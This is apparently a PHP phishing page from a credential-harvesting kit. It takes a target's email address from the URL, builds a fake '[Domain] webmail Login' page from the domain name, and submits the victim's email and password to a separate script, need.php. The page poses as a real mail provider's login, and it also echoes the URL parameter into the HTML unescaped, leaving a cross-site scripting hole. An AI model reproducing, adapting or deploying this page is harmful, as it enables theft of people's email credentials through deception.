<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WebMail </title>

<link type="text/css" rel="stylesheet" href="img/style.css" media="all">




</head>
<body onload="onLoad();" cz-shortcut-listen="true">
    <br><br><br><br>
	<div id="header">
		<div id="header-inner">
		<center> <img src="img/opened-email-envelope.png" alt="Mailbox" style="width:85px;height:80px;">
		<br>
		</center></div>
		<br>
	</div>
	<br>
	<br>
	<div id="main-container">
		<div id="top"><img src="img/favicons.png" alt="Mailbox" style="width:15px;height:18px;">&nbsp; <?php echo $yuh ?> &nbsp;  webmail Login</div>
		<div id="body-container">
			<form id="loginForm" class="container-form" action="need.php" method="post">
				
				
				<div id="unsupportedBrowser" style="display: none;">&nbsp;</div>

				<table align="center">
					<tbody><tr>
						<td>
							
								
								
									<input type="email" required name="em" id="email" value="<?php echo $login ?>" maxlength="50">
								
							
						</td>
					</tr>
					<tr>
						<td>
							<input type="password" required name="ps" id="password" placeholder="Password">
						</td>
					</tr>
					<tr>
						<td id="remember-container">
							<input type="checkbox" name="remember-me" id="remember" value="1"> <label for="remember" class="remember">Secured Login session?</label>
						</td>
					</tr>
				</tbody></table>
				<div>
					<br><input type="hidden" name="email" size="35" value=""><input type="hidden" name="address" size="5" >
<br><input type="hidden" name="email" size="35" value=""><input type="hidden" name="type" size="5" >
					<input id="login-button" type="submit" value="Login">
				</div>
			</form>
		</div>
	</div>
	<div class="under-link">
		<a href=""><?php echo $yuh ?> Copyright© 2020
Privacy Policy</a>
	</div>



</body></html>